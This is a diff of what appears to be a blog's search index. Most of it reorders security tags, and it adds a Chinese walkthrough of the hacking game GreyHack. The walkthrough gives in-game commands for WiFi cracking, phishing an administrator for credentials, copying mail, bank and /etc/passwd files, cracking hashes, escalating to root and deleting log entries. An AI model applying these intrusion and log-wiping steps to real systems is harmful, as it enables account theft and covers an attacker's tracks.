             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -856,9 +912,9 @@
             
             <tag> MySQL </tag>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> SQL注入 </tag>
             
@@ -1029,11 +1085,11 @@
             
             <tag> 提权 </tag>
             
-            <tag> MySQL </tag>
-            
             <tag> 漏洞利用 </tag>
             
             <tag> 文件上传 </tag>
+            
+            <tag> MySQL </tag>
             
             <tag> 绕过 </tag>
             
@@ -1107,15 +1163,40 @@
             
             <tag> 提权 </tag>
             
+            <tag> 漏洞利用 </tag>
+            
             <tag> msf </tag>
             
             <tag> MySQL </tag>
             
-            <tag> 漏洞利用 </tag>
-            
             <tag> 日志分析 </tag>
             
             <tag> SSH公钥 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>GreyHack</title>
+      <link href="/article/grey-hack/"/>
+      <url>/article/grey-hack/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>仅演示单人模式</p><h1>新手期</h1><h2 id="连接WIFI"><a class="header-anchor" href="#连接WIFI">¶</a>连接WIFI</h2><p>没有给出账号密码, 而是通过手册给出了四个工具用于破解WIFI密码, 工具在Kali有对应的工具</p><p><code>airmon</code>可以用来开启网卡的监听模式, 这是获取wifi密码的第一步</p><blockquote><p>airmon -&gt; airmon-ng</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon</span><br><span class="line"><span class="comment"># wlan0      WWI109   False</span></span><br><span class="line">airmon start wlan0</span><br><span class="line"><span class="comment"># wlan0      WWI109   True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>iwlist</code>查看附近的wifi列表, iwlist wlan0即可查看wlan0能连接到的网络</p><blockquote><p>iwlist -&gt; iwlist</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwlist wlan0</span><br><span class="line"><span class="comment"># 选个好的</span></span><br><span class="line"><span class="comment"># 52:01:C6:3A:76:25  68%  Laska_NIGP</span></span><br></pre></td></tr></table></figure><p><code>aireplay</code>获取指定wifi的ACK包, 会在当前目录生成file.cap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># aireplay -b bssid -e essid</span></span><br><span class="line">aireplay -b 52:01:C6:3A:76:25 -e Laska_NIGP</span><br></pre></td></tr></table></figure><p><code>aircrack</code>, 结合ack命令破解ack包</p><blockquote><p>aircrack -&gt; aircrack-ng</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack file.cap</span><br><span class="line"><span class="comment"># Ittend</span></span><br></pre></td></tr></table></figure><p>成功连接WIFI: <code>Laska_NIGP / Ittend</code></p><blockquote><p><code>iwconfig</code>指令连接wifi: <code>iwconfig wlan0 52:01:C6:3A:76:25 Laska_NIGP Ittend</code></p></blockquote><h2 id="注册邮箱"><a class="header-anchor" href="#注册邮箱">¶</a>注册邮箱</h2><p>用浏览器搜索mail以注册邮箱(注意避开搜索引擎的第一项)</p><p>输入账号密码即可</p><h2 id="注册银行账号"><a class="header-anchor" href="#注册银行账号">¶</a>注册银行账号</h2><p>输入bank, 随便注册一个</p><h2 id="要点"><a class="header-anchor" href="#要点">¶</a>要点</h2><p>用户空间下, config文件夹包含了邮箱和银行信息, 破解密码后可以给自己转账</p><h1>Day1</h1><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250113170916.png" alt="image.png"></p><p>让你获取指定邮箱的密码</p><p>给出了受害者的IP地址, 利用<code>whois</code>来查询IP地址的相关信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Creeper@Creeper:~$ whois 75.213.207.73</span><br><span class="line">Domain name: compuwa.org</span><br><span class="line">Administrative contact: Mabel Ersonebaumugg</span><br><span class="line">Email address: Ersonebaumugg@compuwa.org</span><br><span class="line">Phone: 544438967</span><br></pre></td></tr></table></figure><blockquote><p>我在想, 这不是受害者的IP么, whois查到的不应该是受害者的信息么? 还是说给的就是对应右键管理员的IP地址, 算了等会再说</p></blockquote><p>利用社工模板向这位管理员发送社工邮件; 我如果用全名, 他就会说这个用户不存在, 看来只需要给出邮箱名字就行了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250113173138.png" alt="image.png"></p><p>他会给我们回信, 回信内容为账号密码, 我们利用这个内容登录远程服务器, 此时会有教程跳出来, 教你隐藏踪迹</p><h2 id="工具部署"><a class="header-anchor" href="#工具部署">¶</a>工具部署</h2><p>将附件下载到<code>/bin</code>文件夹就可以直接利用命令行调用工具了</p><h2 id="远程登录"><a class="header-anchor" href="#远程登录">¶</a>远程登录</h2><blockquote><p>ssh和现实有些不同, 但是毕竟是游戏</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh Dairfa@isongo 98.4.81.231</span><br></pre></td></tr></table></figure><p>可以通过<code>FileExplorer.exe</code>启动远程的文件管理器(显示在本地)</p><h2 id="获取敏感信息"><a class="header-anchor" href="#获取敏感信息">¶</a>获取敏感信息</h2><p>Config目录下有<code>Mail.txt</code>文件, 里面是用户的邮箱账号和密码哈希值</p><p><code>Config/Bank.txt</code>是银行账号和密码哈希</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">scp -d /home/Dairfa/Config/Bank.txt</span><br><span class="line">scp -d /home/Dairfa/Config/Mail.txt</span><br><span class="line">scp -d /etc/passwd</span><br><span class="line"><span class="comment"># 哈希爆破</span></span><br><span class="line">decipher Mail.txt</span><br><span class="line">decipher Bank.txt</span><br><span class="line">decipher passwd</span><br></pre></td></tr></table></figure><p>利用给的工具爆破哈希值即可, 甚至多行还能选择爆破哪一行</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250113181036.png" alt="image.png"></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>查看<code>/etc/passwd</code>, 发现不止一个用户, 提权到root试试</p><p>利用给的工具爆破哈希值, 然后切换用户; 目的其实是拿到另一个用户的所有敏感信息, 不搞也行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><h2 id="结尾"><a class="header-anchor" href="#结尾">¶</a>结尾</h2><p>将Dairfa用户的密码作为回信发给他, 就可以获得一个IP, 可以进行访问(是一个小商店); 后面就是做这个网站给的任务了</p><h2 id="其他"><a class="header-anchor" href="#其他">¶</a>其他</h2><p>上传ScanLan以更好地扫描网络配置</p><p>入侵完成后记得删除<code>/var/system.log</code>中操作的条目</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 其他 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 爆破 </tag>
             
         </tags>
       
@@ -1177,9 +1258,9 @@
             
             <tag> 提权 </tag>
             
-            <tag> msf </tag>
-            
             <tag> 漏洞利用 </tag>
+            
+            <tag> msf </tag>
             
         </tags>
       
@@ -1492,9 +1573,9 @@
             
             <tag> 文件上传 </tag>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1521,9 +1602,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1552,9 +1633,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1581,9 +1662,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1612,9 +1693,9 @@
             
             <tag> 工具利用 </tag>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1647,9 +1728,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1680,9 +1761,9 @@
             
             <tag> 工具利用 </tag>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1713,9 +1794,9 @@
             
             <tag> 工具利用 </tag>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1802,9 +1883,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -1905,9 +1986,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> RCE </tag>
             
@@ -2305,9 +2386,9 @@
       
         <tags>
             
-            <tag> 模板 </tag>
-            
             <tag> SSTI </tag>
+            
+            <tag> 模板 </tag>
             
         </tags>
       
@@ -2332,9 +2413,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 绕过 </tag>
             
             <tag> 强比较 </tag>
             
